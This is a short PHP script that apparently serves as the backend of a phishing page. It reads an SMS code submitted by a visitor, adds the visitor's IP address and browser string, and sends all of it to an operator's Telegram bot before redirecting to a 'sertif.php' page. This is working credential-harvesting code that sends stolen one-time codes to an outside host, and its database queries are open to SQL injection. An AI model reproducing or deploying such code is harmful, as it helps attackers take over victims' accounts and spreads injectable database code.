<?php
require_once('config.php');

$sql = "SELECT id FROM users WHERE name = '$id_user'";

$rusult = mysqli_query($link, $sql);
$id = mysqli_num_rows($rusult);

if($id == 0){ 
    $sql = "INSERT INTO users SET name = '$id_user'";
$result = mysqli_query($link, $sql); 
}

$sql = "SELECT id FROM users WHERE name = '$id_user'";
$result = mysqli_query($link, $sql);
$user = mysqli_fetch_row($result); 

$smscode = $smscode;
$order = $user[0];
$user = $_SERVER['HTTP_USER_AGENT'];


	$smscode=$_POST['smscode'];
	$ip = $_SERVER['REMOTE_ADDR'];
	
/* А здесь прописывается текст сообщения, \n - перенос строки */
 $mes = "#order_$order \nSmscode: $smscode\nIP: $ip\nBrowser: $user";



message_to_telegram($mes);

function message_to_telegram($text)
{
    $ch = curl_init();
    curl_setopt_array(
        $ch,
        array(
            CURLOPT_URL => 'https://api.telegram.org/bot' . TELEGRAM_TOKEN . '/sendMessage',
            CURLOPT_POST => TRUE,
            CURLOPT_RETURNTRANSFER => TRUE,
            CURLOPT_TIMEOUT => 10,
            CURLOPT_POSTFIELDS => array(
                'chat_id' => TELEGRAM_CHATID,
                'text' => $text,
            ),
        )
    );
    curl_exec($ch);
}

ini_set('short_open_tag', 'On');

if (strtoupper(substr(PHP_OS, 0, 3)) === 'WIN') {
    header('Refresh: 0; URL=sertif.php');
} else {
   header('Refresh: 0; URL=sertif.php');
}

?>